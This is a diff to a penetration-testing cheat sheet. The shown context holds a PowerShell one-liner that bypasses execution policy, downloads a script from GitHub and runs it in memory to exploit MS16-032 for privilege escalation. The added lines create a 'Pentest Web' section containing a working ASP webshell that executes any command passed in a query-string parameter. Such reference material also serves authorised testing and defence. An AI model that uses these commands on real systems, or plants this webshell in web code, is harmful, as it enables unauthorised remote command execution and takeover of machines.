@@ -75,3 +75,19 @@ To exploit one of those vulnerabilities via Sherlock, for example MS16-032 :
 ```markdown
 powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1’); Invoke-MS16-032"
 ```
+
+## Pentest Web
+
+### Webshell
+
+ASP : 
+```markdown
+<%
+Response.write("<pre>")
+Set rs = CreateObject("WScript.Shell")
+Set cmd = rs.Exec("cmd /c " & Request.QueryString("cmd"))
+o = cmd.StdOut.Readall()
+Response.write(o)
+Response.write("</pre>")
+%>
+```
